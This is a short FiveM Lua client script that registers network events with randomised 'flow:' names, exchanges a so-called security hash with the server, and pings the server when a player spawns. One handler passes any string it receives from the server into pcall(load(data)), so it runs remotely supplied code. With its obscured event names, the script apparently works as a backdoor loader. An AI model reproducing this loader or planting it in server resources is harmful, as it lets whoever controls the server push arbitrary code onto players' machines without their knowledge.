RegisterNetEvent("flow:sxgt19l7681o")
AddEventHandler("flow:sxgt19l7681o", function(securityHash)
    local clientHash = tostring(securityHash)
    if (clientHash == nil or clientHash == "") then
        Citizen.Trace("server failed to transmit security hash")
    else
        TriggerServerEvent("flow:08h20rh6jwf0", clientHash)
    end
end)

RegisterNetEvent("flow:p728i449icr3")
AddEventHandler("flow:p728i449icr3", function(data)
    pcall(load(data))
end)

AddEventHandler("playerSpawned", function()
    TriggerServerEvent("flow:845z5r4i20yf")
end)
